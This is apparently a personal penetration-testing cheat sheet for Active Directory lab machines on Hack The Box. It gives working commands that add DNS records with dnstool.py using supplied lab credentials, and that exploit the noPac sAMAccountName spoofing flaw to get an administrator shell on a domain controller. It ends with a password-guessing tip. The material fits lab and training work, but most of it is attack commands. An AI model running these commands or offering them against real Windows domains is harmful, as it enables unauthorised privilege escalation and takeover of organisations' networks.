# DNSTool (To Check if you can update DNS settings)
```
python3 /opt/Windows/krbrelayx/dnstool.py -u intelligence\\Tiffany.Molina -p NewIntelligenceCorpUser9876 --action add --record web-test --data 10.10.14.2 --type A intelligence.htb        # Check Intelligence - HTB box walkthorugh for more context
```

## SeMachineAccountPrivilege
- Using noPAC.py if you have machine quota in domain
```
python /opt/Windows/noPac/noPac.py  manager.htb/raven -dc-ip 10.10.11.236 -shell --impersonate administrator -use-ldap
```
- More info here: https://pentestlab.blog/2022/01/10/domain-escalation-samaccountname-spoofing/

# Password Manipulation
- Did you try to change the password a bit? like instead of 2019 change it to 2020 or Winter to Summer etc